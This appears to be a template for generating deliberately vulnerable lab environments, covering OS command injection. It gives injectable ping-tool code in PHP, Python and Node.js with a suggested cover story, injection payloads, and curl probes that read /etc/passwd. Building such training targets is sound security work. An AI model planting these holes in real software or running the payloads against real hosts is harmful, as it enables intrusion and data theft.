---
id: cmd_injection
type: web_vulnerability
description: An OS command injection vulnerability where user input is passed unsanitized to a shell command, allowing arbitrary command execution on the host.
required_vars: []
---
# Atom: OS Command Injection

User-controlled input is passed directly to a shell execution function without sanitization. An attacker appends shell metacharacters (`;`, `&&`, `|`, `$(...)`) to break out of the intended command and execute arbitrary OS commands as the web server process user.

### Logic Requirements:
1. User input is concatenated into a string passed to a shell execution function.
2. Shell metacharacters are not stripped or escaped.
3. The command output (or a portion of it) is reflected in the HTTP response, confirming execution to the attacker.
4. The web server process runs as a non-root user (typically `www-data`) — RCE is achieved as that user first, then escalated via a separate privilege escalation atom.

### Synthesis Guidance:
The natural cover story for this vulnerability is a network diagnostic utility — a ping tool, a DNS lookup page, or a port checker — where the user supplies a hostname or IP address that gets passed to a system command. This is a plausible feature for a sysadmin panel or internal tool.

**PHP (Apache — shell_exec):**
```php
$host = $_GET['host'];
$output = shell_exec("ping -c 2 " . $host);
echo "<pre>" . $output . "</pre>";
```
Injection: `127.0.0.1; id` or `127.0.0.1$(id)` or `127.0.0.1 && cat /etc/passwd`

**Python / Flask (subprocess):**
```python
import subprocess
host = request.args.get('host', '')
result = subprocess.run(f"ping -c 2 {host}", shell=True, capture_output=True, text=True)
return f"<pre>{result.stdout}</pre>"
```
Injection: `127.0.0.1; id` or `127.0.0.1 && cat /etc/passwd`

**Node.js / Express (child_process.exec):**
```js
const { exec } = require('child_process');
const host = req.query.host;
exec(`ping -c 2 ${host}`, (err, stdout) => {
    res.send(`<pre>${stdout}</pre>`);
});
```
Injection: `127.0.0.1; id` or `127.0.0.1 && cat /etc/passwd`

### Testing Guidance:
**Layer 1 — Internal state check:**
Confirm that a command separator causes the injected command output to appear in the response:
```bash
curl -s "http://localhost/app?host=127.0.0.1;id"
```
The response must contain `uid=` output from `id`, confirming command injection.

**Layer 2 — External attack probe (from attacker container):**
```bash
# Confirm injection with id command
curl -s "http://target/app?host=127.0.0.1%3Bid" | grep "uid="

# Read a sensitive file
curl -s "http://target/app?host=127.0.0.1%3Bcat+/etc/passwd" | grep "root:"
```
A successful result shows OS command output (uid, file contents) in the HTTP response body.
